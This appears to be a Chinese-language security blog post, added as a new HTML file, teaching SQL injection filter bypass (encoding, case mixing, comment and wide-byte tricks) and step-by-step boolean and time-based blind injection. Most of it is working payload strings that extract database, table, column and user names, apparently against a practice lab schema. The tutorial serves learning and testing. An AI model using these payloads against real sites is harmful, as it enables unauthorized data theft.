@@ -1,0 +1,253 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    NYQX
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="NYQX" />
+    
+    	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+</head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Ting</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(ww.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >二见SQL：过滤绕过与盲注</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/2018/07/06/SQL2/1.jpg" alt="1"><br>&emsp;&emsp;表面坚强，内心凉凉。<br>&emsp;&emsp;若要年华不负，唯有勇敢以付。  </p>
+<hr>
+<p><br></p>
+<h3 id="1、过滤绕过"><a href="#1、过滤绕过" class="headerlink" title="1、过滤绕过"></a>1、过滤绕过</h3><h4 id="0-、小前言"><a href="#0-、小前言" class="headerlink" title="(0)、小前言"></a>(0)、小前言</h4><p>&emsp;&emsp;SQL注入的过程中有些特定的字符或者字符串会被过滤，数据库无法真正读入查询语句，<br>因此我们需要绕过这些过滤。</p>
+<h4 id="1-、绕过技术"><a href="#1-、绕过技术" class="headerlink" title="(1)、绕过技术"></a>(1)、绕过技术</h4><h5 id="1-运用编码技术的绕过"><a href="#1-运用编码技术的绕过" class="headerlink" title="1.运用编码技术的绕过"></a>1.运用编码技术的绕过</h5><p><strong>使用ASCII编码：</strong><br><em>例：</em><br>&emsp;&emsp;<em>SELECT FROM Users WHERE username =   CHAR(101,97,115,116)</em><br>&emsp;&emsp;<em>SELECT FROM Users WHERE username = ‘east’</em><br><strong>使用url编码：</strong><br><em>例：</em><br>&emsp;&emsp;<em>SELECT password FROM Users WHERE username = 0x61646D696E</em><br>&emsp;&emsp;<em>SELECT password FROM Users WHERE username = admin</em></p>
+<h5 id="2-运用重复技术的绕过"><a href="#2-运用重复技术的绕过" class="headerlink" title="2.运用重复技术的绕过"></a>2.运用重复技术的绕过</h5><p><em>例：admin —&gt; adadminmin</em><br><em>例：admin —&gt; adminadmin</em></p>
+<h5 id="3-运用大小写交替混用的绕过"><a href="#3-运用大小写交替混用的绕过" class="headerlink" title="3.运用大小写交替混用的绕过"></a>3.运用大小写交替混用的绕过</h5><p><em>例：UnIoN —&gt; SeLeCT</em></p>
+<h5 id="4-一些特别元素的过滤绕过"><a href="#4-一些特别元素的过滤绕过" class="headerlink" title="4.一些特别元素的过滤绕过"></a>4.一些特别元素的过滤绕过</h5><h6 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a><1>过滤空格</1></h6><p><strong>两个空格代替一个空格，Tab代替空格</strong><br><strong>注释符号代替空格 ( /*注释*/ )</strong><br>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username=admin</span><br></pre></td></tr></table></figure></p>
+<p><strong>用括号代替空格</strong><br>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select(user())from dual where(1=1)and(2=2)*</span><br></pre></td></tr></table></figure></p>
+<p><strong>用+代替空格</strong><br>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT +password+ FROM + Users + WHERE +username=admin</span><br></pre></td></tr></table></figure></p>
+<p><strong>%a0=空格</strong><br>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a %a0 %20 %09 %0B %0C %0D</span><br></pre></td></tr></table></figure></p>
+<p><strong>用花括号代替空格 {}</strong><br><strong>单引号双引号代替空格</strong></p>
+<h6 id="过滤information-schema-tables等关键表名"><a href="#过滤information-schema-tables等关键表名" class="headerlink" title="过滤information_schema.tables等关键表名"></a><2>过滤information_schema.tables等关键表名</2></h6><p>&emsp;&emsp;在schema与tables中间加空格<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">information_schema . tables()</span><br></pre></td></tr></table></figure></p>
+<h6 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a><3>过滤引号</3></h6><p>&emsp;&emsp;使用十六进制可以绕过引号<br>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select column_name from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line">select column_name from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure></p>
+<h6 id="过滤注释符号-，–"><a href="#过滤注释符号-，–" class="headerlink" title="过滤注释符号(#，–+)"></a><4>过滤注释符号(#，–+)</4></h6><p>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1’ union select 1,2,3||’1 </span><br><span class="line">#最后的||’1闭合查询语句的最后的单引号)</span><br><span class="line">id=1’ union select 1,2,’3</span><br></pre></td></tr></table></figure></p>
+<h6 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a><5>过滤逗号</5></h6><p>&emsp;&emsp;在盲注的时候需要使用substr(),mid(),limit，这些句子的方法会使用逗号。<br>·substr(),mid()等函数中的逗号过滤<br>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#使用from for</span><br><span class="line">select substr(database(),1,1);</span><br><span class="line">select mid(database(),1,1)</span><br><span class="line">select substr(database() from 1 for 1)</span><br><span class="line">select mid(database() from 1 for 1)</span><br><span class="line">#使用join：</span><br><span class="line">union select 1,2</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br><span class="line">#使用like：</span><br><span class="line">select ascii(mid(user(),1,1))=80</span><br><span class="line">select user() like &apos;r%&apos;</span><br></pre></td></tr></table></figure></p>
+<p>·limit中的逗号过滤<br>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from news limit 0,1</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure></p>
+<h6 id="过滤sleep"><a href="#过滤sleep" class="headerlink" title="过滤sleep"></a><6>过滤sleep</6></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">benchmark(x, y)</span><br><span class="line">benchmark(10000000,sha(1))</span><br><span class="line">#10000000次sha(1)，来时间延迟</span><br></pre></td></tr></table></figure>
+<p>若sleep中不能使用数字<br>用pi()函数绕过:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sleep(ceil(pi()))</span><br><span class="line">#pi()为圆周率计算，ceil为向上取整函数</span><br></pre></td></tr></table></figure></p>
+<h6 id="过滤‘-lt-’与‘-gt-’"><a href="#过滤‘-lt-’与‘-gt-’" class="headerlink" title="过滤‘&lt;’与‘&gt;’"></a><7>过滤‘&lt;’与‘&gt;’</7></h6><p>&emsp;&emsp;使用greatest()(&gt;)、least()(&lt;)绕过比较操作符(前者返回最大值，后者返回最小值)<br>&emsp;&emsp;greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。<br>例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64 </span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;使用between and：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">between a and b：</span><br><span class="line">#返回a，b之间的数据，不包含b。</span><br></pre></td></tr></table></figure></p>
+<h6 id="过滤or-and-xor-not"><a href="#过滤or-and-xor-not" class="headerlink" title="过滤or and xor not"></a><8>过滤or and xor not</8></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and=&amp;&amp;  or=||   xor=|   not=!</span><br></pre></td></tr></table></figure>
+<h5 id="5-宽字节注入绕过"><a href="#5-宽字节注入绕过" class="headerlink" title="5.宽字节注入绕过"></a>5.宽字节注入绕过</h5><p>&emsp;&emsp;过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 \’ 。<br>&emsp;&emsp;在MySQL中使用GBK编码的时候，会认为两个字符为一个汉字，一般有两种思路：<br>&emsp;&emsp;<strong>%df 吃掉 \ 具体的方法：</strong>urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ,而MySQL在GBK编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure></p>
+<h5 id="6-利用等价函数绕过"><a href="#6-利用等价函数绕过" class="headerlink" title="6.利用等价函数绕过"></a>6.利用等价函数绕过</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt; benchmark()</span><br><span class="line">concat_ws()==&gt; group_concat()</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br><span class="line">#举例：</span><br><span class="line">substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　</span><br><span class="line">#或者：</span><br><span class="line">substr((select &apos;password&apos;),1,1) = 0x70</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x69) = 1</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x70) = 0</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x71) = -1</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<h5 id="注：MySQL条件注释的利用。"><a href="#注：MySQL条件注释的利用。" class="headerlink" title="注：MySQL条件注释的利用。"></a><strong>注：</strong>MySQL条件注释的利用。</h5><p>/<em>! … </em>/:其中的语句如果在其它数据库中是不会被执行，但在MySQL中它会执行。<br>/<em>!50000select</em>/:50000版本以上的不执行括号中的语句，否则必定执行。</p>
+<hr>
+<p><br></p>
+<h3 id="2、两种盲注"><a href="#2、两种盲注" class="headerlink" title="2、两种盲注"></a>2、两种盲注</h3><h4 id="0-、小前言-1"><a href="#0-、小前言-1" class="headerlink" title="(0)、小前言"></a>(0)、小前言</h4><p><strong>盲注的定义：</strong>sql盲注就是不直接显示搜索到的结果，而从其他方式来推断得出结果的sql注入。<br><strong>盲注的类型：</strong>布尔型盲注和时间型盲注(第三类：报错型盲注)。<br><strong>涉及函数：</strong><br>1) substr() 用于截断字符串</p>
+<blockquote>
+<p>substr(string,start,length)<br>string(必需)规定要返回其中一部分的字符串。<br>start(必需)规定在字符串的何处开始。<br>length(可选)规定被返回字符串的长度。</p>
+</blockquote>
+<p>2) mid()函数</p>
+<blockquote>
+<p>mid(striing,start,length)<br>string(必需)规定要返回其中一部分的字符串。<br>start(必需)规定开始位置（起始值是 1）。<br>length(可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本。</p>
+</blockquote>
+<p>3) limit offset 与 limit 用于查询到多条记录时选取第几条，再猜取内容，不然只会猜取第一条</p>
+<blockquote>
+<p><em>例:</em><br>语句1：select * from student limit 9,4<br>语句2：slect * from student limit 4 offset 9<br>//语句1和2均返回表student的第10、11、12、13行<br>//语句2中的4表示返回4行，9表示从表的第十行开始</p>
+</blockquote>
+<h4 id="1-、布尔型盲注"><a href="#1-、布尔型盲注" class="headerlink" title="(1)、布尔型盲注"></a>(1)、布尔型盲注</h4><p>&emsp;&emsp;只有false和true两种状态，过程中需要猜测，直到猜到正确型为止。</p>
+<h5 id="布尔型盲注步骤"><a href="#布尔型盲注步骤" class="headerlink" title="布尔型盲注步骤"></a>布尔型盲注步骤</h5><h6 id="判断是否有盲注点"><a href="#判断是否有盲注点" class="headerlink" title="判断是否有盲注点"></a><1>判断是否有盲注点</1></h6><p>&emsp;&emsp;只要当SQL语句执行成功和失败的返回的页面存在某种<strong>固定差异</strong>，即存在布尔型盲注点。<br>输入1’ and ‘1’ = ‘1，返回true;<br>输入1’ and ‘1’ = ‘2，返回false，并且没有返回。<br>如图：<br><img src="/2018/07/06/SQL2/2.jpg" alt="2"><br><img src="/2018/07/06/SQL2/3.jpg" alt="2"></p>
+<h6 id="利用函数来搜集信息"><a href="#利用函数来搜集信息" class="headerlink" title="利用函数来搜集信息"></a><2>利用函数来搜集信息</2></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos; and substring(user(),1,1) =&apos;r&apos; --+</span><br><span class="line">#截取第一位开始的一个</span><br></pre></td></tr></table></figure>
+<p>全句：select 2列 from 表 where name = ‘1’  and substring(user(),1,1) =’r’ –+’</p>
+<h6 id="猜解库，表，列，内容"><a href="#猜解库，表，列，内容" class="headerlink" title="猜解库，表，列，内容"></a><3>猜解库，表，列，内容</3></h6><p>&emsp;&emsp;用字典文件替换db,table,column,如果不存在，返回false界面；存在，返回true界面。<br>(1)猜解当前数据库的名字<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=1&apos; and ascii(mid(database(),1,1))&gt;115--+’</span><br></pre></td></tr></table></figure></p>
+<p>全句：select 2列 from 表 where name = ‘1’ and ascii(mid(database(),1,1))&gt;115–+’<br>(2)猜解数据库的表名<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+</span><br></pre></td></tr></table></figure></p>
+<p>(3)猜解表中的列名<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105--+</span><br></pre></td></tr></table></figure></p>
+<p>(4)猜解列名对应的内容<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=&apos; 1&apos; and ascii(substr((select username from security.users order by id limit 0,1),1,1))=68--+</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-、时间型盲注"><a href="#2-、时间型盲注" class="headerlink" title="(2)、时间型盲注"></a>(2)、时间型盲注</h4><p>&emsp;&emsp;对一个命令只有一个固定的反应，如果是正确的就会等待一定时间再反应，如果是错误的就会立刻反应。</p>
+<h5 id="时间型盲注步骤"><a href="#时间型盲注步骤" class="headerlink" title="时间型盲注步骤"></a>时间型盲注步骤</h5><h6 id="判断是否有盲注点-1"><a href="#判断是否有盲注点-1" class="headerlink" title="判断是否有盲注点"></a><1>判断是否有盲注点</1></h6><p>&emsp;&emsp;SQL语句执行成功和失败的返回的页面不存在差异，需要通过以下语句判断是否存在时间型盲注点。<br>$name=1’ and if(‘1’ = ‘1’,1, sleep(5)) –+  (不延迟返回为true)<br>$name=1’ and if(‘1’ = ‘2’,1, sleep(5)) –+  (延迟返回为false)<br>全句：select 列 from 表 where name = ‘1’ and if(‘1’ = ‘1’,1,sleep(5)) –+</p>
+<h6 id="利用函数来搜集信息-1"><a href="#利用函数来搜集信息-1" class="headerlink" title="利用函数来搜集信息"></a><2>利用函数来搜集信息</2></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=&apos; or if( (select substring( user(),1,1 )=&apos;r‘),1, sleep(5)) --+ </span><br><span class="line">#截取第一位开始的一个</span><br><span class="line">sleep(5)：若是第一个字符为r立刻反应，否则就等待五秒再反应</span><br></pre></td></tr></table></figure>
+<p>全句：select 2列 from 表 where name = ‘’ or if( (select substring( user(),1,1 )=’r’),1, sleep(5)) –+’</p>
+<h6 id="猜解库，表，列，内容-1"><a href="#猜解库，表，列，内容-1" class="headerlink" title="猜解库，表，列，内容"></a><3>猜解库，表，列，内容</3></h6><p>(1)猜解当前数据库的名字<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=1&apos; and if(ascii(substring(database(),1,1)) =115,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p>
+<p>(2)猜解数据库的表名<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=1&apos; and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p>
+<p>(3)猜解表中的列名<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=1&apos; and if(ascii(substring((select column_name from 	information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p>
+<p>(4)猜解列名对应的内容<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$name=1&apos; and if(ascii(substr((select username from security.users order by id 	limit 0,1),1,1))=68,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p>
+<hr>
+<p><br></p>
+<h3 id="吾王镇楼！"><a href="#吾王镇楼！" class="headerlink" title="吾王镇楼！"></a>吾王镇楼！</h3><p><img src="/2018/07/06/SQL2/w.jpg" alt="saber"></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 valine -->
+<div id="comment">
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#comment' ,
+        notify: true,
+        verify: false,
+        app_id: 'your appId',
+        app_key: 'your appkey',
+        placeholder: 'Please leave your footprints',
+        pageSize: '10',
+        avatar: '',
+        avatar_cdn: 'https://gravatar.loli.net/avatar/'
+    });
+</script>
+</div>
+<style>
+   #comment{
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+            	<span id="busuanzi_container_site_pv">2018总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
